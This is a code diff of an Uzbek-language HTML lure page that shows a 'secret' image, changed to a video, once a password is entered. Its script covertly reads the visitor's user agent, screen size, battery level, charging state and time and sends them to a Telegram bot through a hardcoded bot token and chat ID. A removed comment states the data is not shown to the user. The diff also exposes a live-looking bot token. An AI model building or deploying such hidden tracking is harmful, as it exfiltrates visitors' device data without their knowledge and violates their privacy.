@@ -2,7 +2,7 @@
 <html lang="uz">
 <head>
   <meta charset="UTF-8">
-  <title>🔐 Maxfiy Rasm</title>
+  <title>🔐 Maxfiy Video</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
   <style>
@@ -50,8 +50,8 @@
       display: none;
     }
 
-    img {
-      max-width: 100%;
+    video {
+      width: 100%;
       border-radius: 12px;
       margin-top: 10px;
     }
@@ -76,53 +76,55 @@
     <button onclick="checkPassword()">▶️ Kirish</button>
 
     <div id="secretContent" class="hidden">
-      <h3>🖼️ Intelex best of best😂:</h3>
-      <img src="image.png" alt="Maxfiy Rasm">
-
+      <h3>Men bir tush ko'rdim😂:</h3>
+      <video controls>
+        <source src="video.mp4" type="video/mp4">
+        Brauzeringiz video formatini qo‘llab-quvvatlamaydi.
+      </video>
     </div>
   </div>
 
   <script>
-  async function checkPassword() {
-    const password = document.getElementById("password").value;
-    if (password === "1002") {
-      document.getElementById("secretContent").classList.remove("hidden");
+    async function checkPassword() {
+      const password = document.getElementById("password").value;
+      if (password === "2332") {
+        document.getElementById("secretContent").classList.remove("hidden");
 
-      const device = navigator.userAgent;
-      const width = screen.width;
-      const height = screen.height;
-      const now = new Date().toLocaleString();
+        const device = navigator.userAgent;
+        const width = screen.width;
+        const height = screen.height;
+        const now = new Date().toLocaleString();
 
-      let batteryLevel = "Nomaʼlum";
-      let isCharging = "Aniqlanmayapti 🔌";
-      if (navigator.getBattery) {
-        try {
-          const battery = await navigator.getBattery();
-          batteryLevel = `${Math.round(battery.level * 100)}%`;
-          isCharging = battery.charging ? "Ha 🔌" : "Yo‘q 🔋";
-        } catch (e) {
-          batteryLevel = "Topilmadi";
+        let batteryLevel = "Nomaʼlum";
+        let isCharging = "Aniqlanmayapti 🔌";
+        if (navigator.getBattery) {
+          try {
+            const battery = await navigator.getBattery();
+            batteryLevel = `${Math.round(battery.level * 100)}%`;
+            isCharging = battery.charging ? "Ha 🔌" : "Yo‘q 🔋";
+          } catch (e) {
+            batteryLevel = "Topilmadi";
+          }
         }
+
+        // Telegramga xabar yuboriladi
+        const msg = `🧠 Yangi foydalanuvchi:\n📱 Qurilma: ${device}\n🔋 Zaryad: ${batteryLevel}\n⚡ Zaryadlanmoqda: ${isCharging}\n📐 Ekran: ${width}x${height}\n🕒 Vaqt: ${now}`;
+        const botToken = "7706854300:AAFHkDtTEz9eDMpXcc-pshZnBVJ8clqr74k";  // <- o'zingiz yozasiz
+        const chatId = "-2282908203"; // <- admin Telegram ID
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: msg
+          })
+        });
+      } else {
+        alert("❌ Noto'g'ri parol!");
       }
-
-      // Faqat Telegramga yuboriladi, foydalanuvchiga ko‘rsatilmaydi
-      const msg = `🧠 Yangi foydalanuvchi:\n📱 Qurilma: ${device}\n🔋 Zaryad: ${batteryLevel}\n⚡ Zaryadlanmoqda: ${isCharging}\n📐 Ekran: ${width}x${height}\n🕒 Vaqt: ${now}`;
-      const botToken = "7706854300:AAFHkDtTEz9eDMpXcc-pshZnBVJ8clqr74k";  // <- o'zingiz yozasiz
-      const chatId = "7445142075";      // <- admin Telegram ID
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: msg
-        })
-      });
-    } else {
-      alert("❌ Noto'g'ri parol!");
     }
-  }
-</script>
+  </script>
 
 </body>
 </html>
